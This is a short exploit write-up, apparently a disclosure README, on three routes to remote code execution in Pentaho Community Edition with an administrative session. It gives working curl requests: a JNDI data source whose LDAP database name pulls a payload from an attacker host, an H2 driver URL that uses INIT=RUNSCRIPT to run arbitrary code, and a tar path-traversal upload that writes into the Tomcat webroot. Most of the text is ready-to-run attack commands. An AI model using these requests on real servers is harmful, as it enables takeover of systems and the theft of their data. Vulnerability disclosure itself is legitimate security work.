# Pentaho community edition high-priv RCE

Different ways to achieve code execution using an admin account (in practice the Manage Data Sources role is enough although none of the default credentials have this role).

## JNDI

The software supports JNDI data sources and putting an ldap url as database name is sufficient to have the attackers payload fetched from a remote codebase (same technique as log4shell).

```
curl -X PUT -v http://host/pentaho/plugin/data-access/api/connection/test -H 'Cookie: JSESSIONID=[COOKIE HERE]' -H 'Content-Type: application/json' --data '{"usingConnectionPool":false,"maximumPoolSize":20,"connectSql":"","databaseName":"[ldap://attacker/a]","name":"test","attributes":{},"connectionPoolingProperties":{},"extraOptions":{},"extraOptionsOrder":{},"accessType":"JNDI","databaseType":{"defaultDatabasePort":3306,"extraOptionsHelpUrl":"http://dev.mysql.com/doc/refman/5.0/en/connector-j-reference-configuration-properties.html","name":"MySQL","shortName":"MYSQL","supportedAccessTypes":["NATIVE","ODBC","JNDI"]}}'
```

## H2 Driver

Similarly to CVE-2022-23221, we can create an in-memory connection from which running arbitrary code is supported by the database driver. In the following we use a file uploaded using the UploadService endpoint but an http url would work just as well.

```
curl -X PUT -v http://host/pentaho/plugin/data-access/api/connection/test -H 'Cookie: JSESSIONID=[COOKIE HERE]' -H 'Content-Type: application/json' --data '{"usingConnectionPool":false,"maximumPoolSize":20,"connectSql":"","name":"test","attributes":{"CUSTOM_URL":"jdbc:h2:mem:1337;INIT=RUNSCRIPT FROM '"'"'../../pentaho-solutions/system/metadata/csvfiles/sql.txt'"'"'","CUSTOM_DRIVER_CLASS":"org.h2.Driver"},"connectionPoolingProperties":{},"extraOptions":{},"extraOptionsOrder":{},"accessType":"NATIVE","databaseType":{"defaultDatabasePort":-1,"name":"Generic database","shortName":"GENERIC","supportedAccessTypes":["NATIVE","ODBC","JNDI"]}}'
```

## Path traversal

The UploadService endpoint is vulnerable to path traversal. Both handleTar and handleZip do not validate whether or not zip entries have dot dot slash in them.

Here is an example creating a tar archive that will write a txt file at the webroot once extracted.

```
echo TEST > BAABAABAABAABtomcatBwebappsBROOTBmyfile.txt
tar cvf test.tar BAABAABAABAABtomcatBwebappsBROOTBmyfile.txt
sed -i 's/BAABAABAABAABtomcatBwebappsBROOTBmyfile.txt/\/..\/..\/..\/..\/tomcat\/webapps\/ROOT\/myfile.txt/g' test.tar
```

```
curl -v http://host/pentaho/UploadService?file_name=test.tar&mark_temporary=false&unzip=true' -H 'Cookie: JSESSIONID=[COOKIE HERE]' -F uploadFormElement=@test.tar
```

On versions that still allow uploading files with no extensions by default one may be able to overwrite jar in the classpath by writing to one of the /proc/self/fd/[integer] symlinks.

